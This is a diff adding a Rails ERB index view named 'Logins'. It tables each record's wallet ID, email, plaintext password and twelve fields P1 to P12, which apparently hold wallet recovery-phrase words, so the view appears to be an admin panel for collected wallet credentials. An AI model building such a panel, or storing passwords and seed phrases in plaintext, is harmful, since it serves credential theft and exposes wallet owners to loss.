@@ -1,0 +1,55 @@
+<p id="notice"><%= notice %></p>
+
+<h1>Logins</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Wallet</th>
+      <th>Email</th>
+      <th>Password</th>
+      <th>P1</th>
+      <th>P2</th>
+      <th>P3</th>
+      <th>P4</th>
+      <th>P5</th>
+      <th>P6</th>
+      <th>P7</th>
+      <th>P8</th>
+      <th>P9</th>
+      <th>P10</th>
+      <th>P11</th>
+      <th>P12</th>
+      <th colspan="3"></th>
+    </tr>
+  </thead>
+
+  <tbody>
+    <% @logins.each do |login| %>
+      <tr>
+        <td><%= login.wallet_id %></td>
+        <td><%= login.email %></td>
+        <td><%= login.password %></td>
+        <td><%= login.p1 %></td>
+        <td><%= login.p2 %></td>
+        <td><%= login.p3 %></td>
+        <td><%= login.p4 %></td>
+        <td><%= login.p5 %></td>
+        <td><%= login.p6 %></td>
+        <td><%= login.p7 %></td>
+        <td><%= login.p8 %></td>
+        <td><%= login.p9 %></td>
+        <td><%= login.p10 %></td>
+        <td><%= login.p11 %></td>
+        <td><%= login.p12 %></td>
+        <td><%= link_to 'Show', login %></td>
+        <td><%= link_to 'Edit', edit_login_path(login) %></td>
+        <td><%= link_to 'Destroy', login, method: :delete, data: { confirm: 'Are you sure?' } %></td>
+      </tr>
+    <% end %>
+  </tbody>
+</table>
+
+<br>
+
+<%= link_to 'New Login', new_login_path %>
